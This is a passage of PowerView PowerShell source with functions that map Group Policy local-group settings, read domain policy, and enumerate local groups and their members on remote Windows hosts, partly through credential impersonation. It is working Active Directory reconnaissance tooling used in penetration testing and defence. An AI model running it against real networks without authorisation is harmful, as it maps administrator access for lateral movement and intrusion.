                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $GPOLocalGroupMapping
                    }
                }
            }

            # find any sites that have this GPO linked through gpLink
            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
<#
.SYNOPSIS

Takes a computer (or GPO) object and determines what users/groups are in the specified
local group for the machine through GPO correlation.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  

.DESCRIPTION

This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
are in the specified local group for a target machine through GPO correlation.

If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
determine the OU the computer is a part of. Then resolve the computer's site name with
Get-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
each resulting GPO group, resolve the resulting user/group name to a full AD object and
return the results. This will return the domain objects that are members of the specified
-LocalGroup for the given computer.

Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
localgroup specifications.

.PARAMETER ComputerIdentity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.

.PARAMETER OUIdentity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local

Finds users who have local admin rights over WINDOWS3 through GPO correlation.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP

Finds users who have RDP rights over WINDOWS4 through GPO correlation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local

.OUTPUTS

PowerView.GGPOComputerLocalGroupMember
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'

            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                # extract any GPOs linked to this computer's OU through gpLink
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # extract any GPOs linked to this computer's site through gpLink
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # process any GPO local group settings from the GPO GUID set
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
<#
.SYNOPSIS

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  

.DESCRIPTION

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller using Get-DomainGPO.

.PARAMETER Domain

The domain to query for default policies, defaults to the current domain.

.PARAMETER Policy

Extract 'Domain', 'DC' (domain controller) policies, or 'All' for all policies.
Otherwise queries for the particular GPO name or GUID.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainPolicyData

Returns the default domain policy for the current domain.

.EXAMPLE

Get-DomainPolicyData -Domain dev.testlab.local

Returns the default domain policy for the dev.testlab.local domain.

.EXAMPLE

Get-DomainGPO | Get-DomainPolicy

Parses any GptTmpl.infs found for any policies in the current domain.

.EXAMPLE

Get-DomainPolicyData -Policy DC -Domain dev.testlab.local

Returns the policy for the dev.testlab.local domain controller.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainPolicyData -Credential $Cred

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $ConvertArguments['Domain'] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments['Identity'] = '*'
        }
        elseif ($Policy -eq 'Domain') {
            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments['Identity'] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # parse the GptTmpl.inf
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}


########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying "-Method WinNT"
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying "-Method WinNT" causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup | Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1\Guest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1\lo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLAB\Dom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLAB\Adm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\loc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\Ent... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLAB\Dom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # try to extract out the machine SID by using the -500 account as a reference
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # DOMAIN\user
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # DOMAIN\machine\user
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
